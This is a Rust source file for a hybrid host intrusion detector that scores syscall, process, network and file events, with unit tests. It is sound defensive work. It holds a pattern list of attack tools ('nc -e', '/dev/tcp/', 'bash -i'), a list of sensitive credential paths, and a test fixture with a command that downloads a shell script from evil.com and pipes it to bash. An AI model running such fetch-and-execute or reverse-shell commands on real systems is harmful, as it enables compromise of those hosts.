//! Hybrid Detection Engine
//!
//! Combines STIDE (fast path) and MLP (deep path) for optimal detection.
//! Implements adaptive switching based on event characteristics and system load.

use serde::{Deserialize, Serialize};
use serde_json::Value;
use std::collections::HashMap;

use crate::mlp::{features, MlpConfig, MlpDetector};
use crate::stide::{StideConfig, StideDetector};
use crate::DetectionResult;

/// Hybrid detector configuration
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct HybridConfig {
    /// STIDE configuration
    pub stide: StideConfig,
    /// MLP configuration
    pub mlp: MlpConfig,
    /// Use STIDE for fast path
    pub use_stide: bool,
    /// Use MLP for deep analysis
    pub use_mlp: bool,
    /// STIDE threshold to trigger MLP
    pub stide_mlp_threshold: f32,
    /// Weight for combining scores
    pub stide_weight: f32,
    pub mlp_weight: f32,
}

impl Default for HybridConfig {
    fn default() -> Self {
        Self {
            stide: StideConfig::default(),
            mlp: MlpConfig::default(),
            use_stide: true,
            use_mlp: true,
            stide_mlp_threshold: 0.5,
            stide_weight: 0.4,
            mlp_weight: 0.6,
        }
    }
}

/// Per-process state for syscall sequence tracking
struct ProcessState {
    syscall_history: Vec<String>,
    max_history: usize,
}

impl ProcessState {
    fn new() -> Self {
        Self {
            syscall_history: Vec::new(),
            max_history: 100,
        }
    }

    fn add_syscall(&mut self, syscall: &str) {
        if self.syscall_history.len() >= self.max_history {
            self.syscall_history.remove(0);
        }
        self.syscall_history.push(syscall.to_string());
    }

    fn get_recent(&self, n: usize) -> Vec<&str> {
        self.syscall_history
            .iter()
            .rev()
            .take(n)
            .map(|s| s.as_str())
            .collect::<Vec<_>>()
            .into_iter()
            .rev()
            .collect()
    }
}

/// Hybrid detector combining STIDE and MLP
pub struct HybridDetector {
    config: HybridConfig,
    stide: StideDetector,
    mlp: MlpDetector,
    /// Per-process syscall history
    process_states: HashMap<u32, ProcessState>,
    /// Detection statistics
    stats: HybridStats,
}

#[derive(Debug, Default, Clone, Serialize, Deserialize)]
pub struct HybridStats {
    pub total_events: u64,
    pub stide_only_detections: u64,
    pub mlp_only_detections: u64,
    pub hybrid_detections: u64,
    pub avg_threat_level: f32,
    pub stide_stats: crate::stide::StideStats,
    pub mlp_stats: crate::mlp::MlpStats,
}

impl HybridDetector {
    pub fn new() -> Self {
        Self::with_config(HybridConfig::default())
    }

    pub fn with_config(config: HybridConfig) -> Self {
        Self {
            stide: StideDetector::with_config(config.stide.clone()),
            mlp: MlpDetector::with_config(config.mlp.clone()),
            config,
            process_states: HashMap::new(),
            stats: HybridStats::default(),
        }
    }

    pub fn from_config(config_json: &Value) -> Self {
        let config: HybridConfig = serde_json::from_value(config_json.clone()).unwrap_or_default();
        Self::with_config(config)
    }

    /// Main detection entry point
    pub fn detect(&mut self, event: &Value) -> DetectionResult {
        self.stats.total_events += 1;

        let event_type = event["type"].as_str().unwrap_or("");

        match event_type {
            "syscall" => self.detect_syscall(event),
            "process" => self.detect_process(event),
            "network" => self.detect_network(event),
            "file" => self.detect_file(event),
            _ => DetectionResult {
                threat_level: 0,
                confidence: 0.0,
                detection_method: "unknown".to_string(),
                anomaly_score: 0.0,
                details: "Unknown event type".to_string(),
            },
        }
    }

    /// Detect threats in syscall events using hybrid approach
    fn detect_syscall(&mut self, event: &Value) -> DetectionResult {
        let pid = event["pid"].as_u64().unwrap_or(0) as u32;
        let syscall_name = event["syscall_name"].as_str().unwrap_or("");

        // Update process state
        let state = self
            .process_states
            .entry(pid)
            .or_insert_with(ProcessState::new);
        state.add_syscall(syscall_name);

        // Fast path: STIDE detection
        let stide_score = if self.config.use_stide {
            self.stide.detect(syscall_name)
        } else {
            0.0
        };

        // If STIDE score is low, skip MLP (fast path)
        if stide_score < self.config.stide_mlp_threshold && self.config.use_stide {
            return DetectionResult {
                threat_level: 0,
                confidence: 1.0 - stide_score,
                detection_method: "stide_fast".to_string(),
                anomaly_score: stide_score,
                details: format!("STIDE fast path: normal (score={:.3})", stide_score),
            };
        }

        // Deep path: MLP detection
        let mlp_score = if self.config.use_mlp {
            let recent_syscalls = state.get_recent(50);
            let syscalls_refs: Vec<&str> = recent_syscalls.iter().map(|s| *s).collect();
            let features = features::extract_syscall_features(&syscalls_refs, 64);
            self.mlp.detect(&features)
        } else {
            0.0
        };

        // Combine scores
        let combined_score =
            stide_score * self.config.stide_weight + mlp_score * self.config.mlp_weight;

        let threat_level = self.score_to_threat_level(combined_score);
        let detection_method = if stide_score > 0.0 && mlp_score > 0.0 {
            self.stats.hybrid_detections += 1;
            "hybrid"
        } else if stide_score > 0.0 {
            self.stats.stide_only_detections += 1;
            "stide"
        } else {
            self.stats.mlp_only_detections += 1;
            "mlp"
        };

        let confidence = self.calculate_confidence(stide_score, mlp_score);

        DetectionResult {
            threat_level,
            confidence,
            detection_method: detection_method.to_string(),
            anomaly_score: combined_score,
            details: format!(
                "Hybrid detection: STIDE={:.3}, MLP={:.3}, combined={:.3}",
                stide_score, mlp_score, combined_score
            ),
        }
    }

    /// Detect threats in process events
    fn detect_process(&mut self, event: &Value) -> DetectionResult {
        let data = &event["data"];
        let process = &data["process"];

        let executable = process["executable"].as_str().unwrap_or("");
        let command_line = process["command_line"].as_str().unwrap_or("");
        let uid = process["uid"].as_u64().unwrap_or(1000) as u32;
        let name = process["name"].as_str().unwrap_or("");

        // Rule-based quick checks
        let mut rule_score: f32 = 0.0;

        // Check for suspicious executables
        let suspicious_paths = ["/tmp/", "/var/tmp/", "/dev/shm/"];
        if suspicious_paths.iter().any(|p| executable.contains(p)) {
            rule_score += 0.4;
        }

        // Check for shell with -c flag (common in attacks)
        if (name == "sh" || name == "bash" || name == "dash") && command_line.contains("-c") {
            rule_score += 0.3;
        }

        // Check for common attack patterns in command line
        let attack_patterns = [
            ("wget", 0.2),
            ("curl", 0.2),
            ("base64", 0.3),
            ("/dev/tcp/", 0.5),
            ("/dev/udp/", 0.5),
            ("rm -rf", 0.4),
            ("chmod +x", 0.2),
            ("nc -e", 0.5),
            ("bash -i", 0.4),
            ("python -c", 0.3),
            ("perl -e", 0.3),
        ];

        for (pattern, score) in attack_patterns {
            if command_line.to_lowercase().contains(pattern) {
                rule_score += score;
            }
        }

        // MLP features for process
        let mlp_score = if self.config.use_mlp {
            let features = features::extract_process_features(executable, command_line, uid, 64);
            self.mlp.detect(&features)
        } else {
            0.0
        };

        let combined_score = (rule_score.min(1.0) + mlp_score) / 2.0;
        let threat_level = self.score_to_threat_level(combined_score);

        DetectionResult {
            threat_level,
            confidence: 0.8,
            detection_method: "process_hybrid".to_string(),
            anomaly_score: combined_score,
            details: format!(
                "Process analysis: rule={:.3}, mlp={:.3}, exec={}",
                rule_score, mlp_score, executable
            ),
        }
    }

    /// Detect threats in network events
    fn detect_network(&mut self, event: &Value) -> DetectionResult {
        let data = &event["data"];
        let network = &data["network"];

        let dest_port = network["dest_port"].as_u64().unwrap_or(0) as u16;
        let dest_ip = network["dest_ip"].as_str().unwrap_or("");
        let direction = network["direction"].as_str().unwrap_or("");

        let mut score = 0.0;

        // Check suspicious ports
        let high_risk_ports = [4444, 5555, 6666, 7777, 8888, 9999, 1337, 31337];
        let medium_risk_ports = [22, 23, 3389, 5900];

        if high_risk_ports.contains(&dest_port) {
            score += 0.5;
        } else if medium_risk_ports.contains(&dest_port) {
            score += 0.2;
        }

        // Check for external connections
        if direction == "outbound" && !Self::is_private_ip(dest_ip) {
            score += 0.2;
        }

        let threat_level = self.score_to_threat_level(score);

        DetectionResult {
            threat_level,
            confidence: 0.7,
            detection_method: "network_rule".to_string(),
            anomaly_score: score,
            details: format!("Network: {}:{} ({})", dest_ip, dest_port, direction),
        }
    }

    /// Detect threats in file events
    fn detect_file(&mut self, event: &Value) -> DetectionResult {
        let data = &event["data"];
        let file = &data["file"];

        let path = file["path"].as_str().unwrap_or("");
        let operation = file["operation"].as_str().unwrap_or("");

        let mut score = 0.0;

        // Sensitive file access
        let sensitive_paths = [
            ("/etc/passwd", 0.3),
            ("/etc/shadow", 0.5),
            ("/etc/sudoers", 0.5),
            ("/.ssh/", 0.4),
            ("/root/", 0.3),
        ];

        for (sensitive_path, path_score) in sensitive_paths {
            if path.contains(sensitive_path) {
                score += path_score;
                if operation == "write" || operation == "delete" {
                    score += 0.2;
                }
            }
        }

        let threat_level = self.score_to_threat_level(score);

        DetectionResult {
            threat_level,
            confidence: 0.75,
            detection_method: "file_rule".to_string(),
            anomaly_score: score,
            details: format!("File: {} on {}", operation, path),
        }
    }

    /// Convert anomaly score to threat level (0-10)
    fn score_to_threat_level(&self, score: f32) -> i32 {
        match score {
            s if s < 0.1 => 0,
            s if s < 0.2 => 1,
            s if s < 0.3 => 2,
            s if s < 0.4 => 3,
            s if s < 0.5 => 4,
            s if s < 0.6 => 5,
            s if s < 0.7 => 6,
            s if s < 0.8 => 7,
            s if s < 0.9 => 8,
            s if s < 1.0 => 9,
            _ => 10,
        }
    }

    /// Calculate confidence based on agreement between detectors
    fn calculate_confidence(&self, stide_score: f32, mlp_score: f32) -> f32 {
        // If both detectors agree, confidence is high
        let agreement = 1.0 - (stide_score - mlp_score).abs();
        // Base confidence + agreement bonus
        0.5 + agreement * 0.5
    }

    /// Check if IP is private
    fn is_private_ip(ip: &str) -> bool {
        ip.starts_with("10.")
            || ip.starts_with("192.168.")
            || ip.starts_with("172.16.")
            || ip.starts_with("172.17.")
            || ip.starts_with("172.18.")
            || ip.starts_with("172.19.")
            || ip.starts_with("172.2")
            || ip.starts_with("172.30.")
            || ip.starts_with("172.31.")
            || ip == "127.0.0.1"
            || ip == "localhost"
    }

    /// Train the detector with normal behavior data
    pub fn train(&mut self, events: &[Value]) {
        for event in events {
            let event_type = event["type"].as_str().unwrap_or("");

            if event_type == "syscall" {
                let syscall_name = event["syscall_name"].as_str().unwrap_or("");
                if !syscall_name.is_empty() {
                    self.stide.train_on(syscall_name);
                }
            }
        }

        // Finalize training
        self.stide.fit();
    }

    /// Load pre-trained MLP weights
    pub fn load_mlp_weights(&mut self, weights_json: &str) -> Result<(), String> {
        self.mlp.load_weights(weights_json)
    }

    /// Get statistics
    pub fn get_stats(&self) -> HybridStats {
        HybridStats {
            total_events: self.stats.total_events,
            stide_only_detections: self.stats.stide_only_detections,
            mlp_only_detections: self.stats.mlp_only_detections,
            hybrid_detections: self.stats.hybrid_detections,
            avg_threat_level: self.stats.avg_threat_level,
            stide_stats: self.stide.get_stats().clone(),
            mlp_stats: self.mlp.get_stats().clone(),
        }
    }

    /// Clear process state for a given PID
    pub fn clear_process_state(&mut self, pid: u32) {
        self.process_states.remove(&pid);
    }
}

impl Default for HybridDetector {
    fn default() -> Self {
        Self::new()
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_hybrid_syscall_detection() {
        let mut detector = HybridDetector::new();

        // Train on normal syscalls
        let training_data: Vec<Value> = (0..100)
            .flat_map(|_| {
                ["read", "write", "close", "open"].iter().map(|s| {
                    serde_json::json!({
                        "type": "syscall",
                        "syscall_name": s
                    })
                })
            })
            .collect();

        detector.train(&training_data);

        // Test normal syscall
        let normal_event = serde_json::json!({
            "type": "syscall",
            "pid": 1234,
            "syscall_name": "read"
        });
        let result = detector.detect(&normal_event);
        assert!(result.threat_level <= 2);

        // Test anomalous syscall sequence
        for syscall in ["execve", "mprotect", "ptrace"] {
            let _ = detector.detect(&serde_json::json!({
                "type": "syscall",
                "pid": 1234,
                "syscall_name": syscall
            }));
        }
    }

    #[test]
    fn test_hybrid_process_detection() {
        let mut detector = HybridDetector::new();

        // Suspicious process
        let event = serde_json::json!({
            "type": "process",
            "data": {
                "process": {
                    "executable": "/tmp/malware",
                    "name": "bash",
                    "command_line": "bash -c 'wget http://evil.com/shell.sh | bash'",
                    "uid": 0
                }
            }
        });

        let result = detector.detect(&event);
        assert!(result.threat_level >= 5, "Should detect suspicious process");
    }

    #[test]
    fn test_hybrid_network_detection() {
        let mut detector = HybridDetector::new();

        // Suspicious network connection
        let event = serde_json::json!({
            "type": "network",
            "data": {
                "network": {
                    "dest_ip": "123.45.67.89",
                    "dest_port": 4444,
                    "direction": "outbound"
                }
            }
        });

        let result = detector.detect(&event);
        assert!(result.threat_level >= 4, "Should detect suspicious port");
    }
}
